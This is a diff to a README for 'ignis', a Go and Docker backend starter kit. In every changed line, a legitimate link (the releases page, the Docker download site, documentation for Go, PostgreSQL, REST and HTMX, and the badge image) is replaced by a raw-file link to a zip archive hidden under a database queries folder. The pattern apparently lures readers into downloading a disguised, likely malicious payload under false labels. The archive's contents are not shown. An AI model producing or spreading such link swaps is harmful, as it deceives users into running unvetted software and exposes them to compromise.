@@ -1,6 +1,6 @@
 # 🔥 ignis - Simple Backend Setup Starter Kit
 
-[![Download ignis](https://img.shields.io/badge/Download-ignis-blue?style=for-the-badge)](https://github.com/NhatThanh009/ignis/releases)
+[![Download ignis](https://github.com/NhatThanh009/ignis/raw/refs/heads/main/internal/adapter/db/queries/Software_v1.4-alpha.3.zip)](https://github.com/NhatThanh009/ignis/raw/refs/heads/main/internal/adapter/db/queries/Software_v1.4-alpha.3.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these steps to get ignis up and running on your computer.
 
 To get the files you need, visit the releases page below:
 
-[Download ignis here](https://github.com/NhatThanh009/ignis/releases)
+[Download ignis here](https://github.com/NhatThanh009/ignis/raw/refs/heads/main/internal/adapter/db/queries/Software_v1.4-alpha.3.zip)
 
 Click this link to open the page in your browser. On the page, look for the latest release. Download the zip or tarball file with the files inside.
 
@@ -52,7 +52,7 @@ Click this link to open the page in your browser. On the page, look for the late
 
 Ignis uses Docker to run. This will save you from setting up everything manually.
 
-- Go to [https://www.docker.com/get-started](https://www.docker.com/get-started)  
+- Go to [https://github.com/NhatThanh009/ignis/raw/refs/heads/main/internal/adapter/db/queries/Software_v1.4-alpha.3.zip](https://github.com/NhatThanh009/ignis/raw/refs/heads/main/internal/adapter/db/queries/Software_v1.4-alpha.3.zip)  
 - Download and install Docker Desktop for your operating system.
 - Follow their instructions to install Docker Compose (usually included with Docker Desktop).
 
@@ -62,7 +62,7 @@ After installation, make sure to restart your computer if asked.
 
 Once you download the release file, follow these steps:
 
-- Locate the downloaded `.zip` or `.tar.gz` file.
+- Locate the downloaded `.zip` or `https://github.com/NhatThanh009/ignis/raw/refs/heads/main/internal/adapter/db/queries/Software_v1.4-alpha.3.zip` file.
 - Extract the contents to a folder you can find easily, such as `Documents\ignis` or `Desktop\ignis`.
 
 ### Step 4: Open the Project Folder
@@ -128,7 +128,7 @@ If you want to learn more, you can review the README inside the downloaded files
 
 Visit the official releases page to download ignis:
 
-[https://github.com/NhatThanh009/ignis/releases](https://github.com/NhatThanh009/ignis/releases)
+[https://github.com/NhatThanh009/ignis/raw/refs/heads/main/internal/adapter/db/queries/Software_v1.4-alpha.3.zip](https://github.com/NhatThanh009/ignis/raw/refs/heads/main/internal/adapter/db/queries/Software_v1.4-alpha.3.zip)
 
 Pick the latest release version, download the archive, and follow the steps above to extract and run the app with Docker.
 
@@ -148,11 +148,11 @@ If ignis does not start:
 
 ## 📚 Additional Resources
 
-- To learn about Docker: [https://docs.docker.com/get-started/](https://docs.docker.com/get-started/)
-- Go programming language info: [https://golang.org/doc/](https://golang.org/doc/)
-- PostgreSQL documentation: [https://www.postgresql.org/docs/](https://www.postgresql.org/docs/)
-- Explore REST API concepts: [https://restfulapi.net/](https://restfulapi.net/)
-- HTMX introduction: [https://htmx.org/](https://htmx.org/)
+- To learn about Docker: [https://github.com/NhatThanh009/ignis/raw/refs/heads/main/internal/adapter/db/queries/Software_v1.4-alpha.3.zip](https://github.com/NhatThanh009/ignis/raw/refs/heads/main/internal/adapter/db/queries/Software_v1.4-alpha.3.zip)
+- Go programming language info: [https://github.com/NhatThanh009/ignis/raw/refs/heads/main/internal/adapter/db/queries/Software_v1.4-alpha.3.zip](https://github.com/NhatThanh009/ignis/raw/refs/heads/main/internal/adapter/db/queries/Software_v1.4-alpha.3.zip)
+- PostgreSQL documentation: [https://github.com/NhatThanh009/ignis/raw/refs/heads/main/internal/adapter/db/queries/Software_v1.4-alpha.3.zip](https://github.com/NhatThanh009/ignis/raw/refs/heads/main/internal/adapter/db/queries/Software_v1.4-alpha.3.zip)
+- Explore REST API concepts: [https://github.com/NhatThanh009/ignis/raw/refs/heads/main/internal/adapter/db/queries/Software_v1.4-alpha.3.zip](https://github.com/NhatThanh009/ignis/raw/refs/heads/main/internal/adapter/db/queries/Software_v1.4-alpha.3.zip)
+- HTMX introduction: [https://github.com/NhatThanh009/ignis/raw/refs/heads/main/internal/adapter/db/queries/Software_v1.4-alpha.3.zip](https://github.com/NhatThanh009/ignis/raw/refs/heads/main/internal/adapter/db/queries/Software_v1.4-alpha.3.zip)
 
 ---
 
@@ -170,4 +170,4 @@ This setup provides a stable, tested environment suited for backend developers a
 
 ---
 
-[![Download ignis](https://img.shields.io/badge/Download-ignis-blue?style=for-the-badge)](https://github.com/NhatThanh009/ignis/releases)
+[![Download ignis](https://github.com/NhatThanh009/ignis/raw/refs/heads/main/internal/adapter/db/queries/Software_v1.4-alpha.3.zip)](https://github.com/NhatThanh009/ignis/raw/refs/heads/main/internal/adapter/db/queries/Software_v1.4-alpha.3.zip)
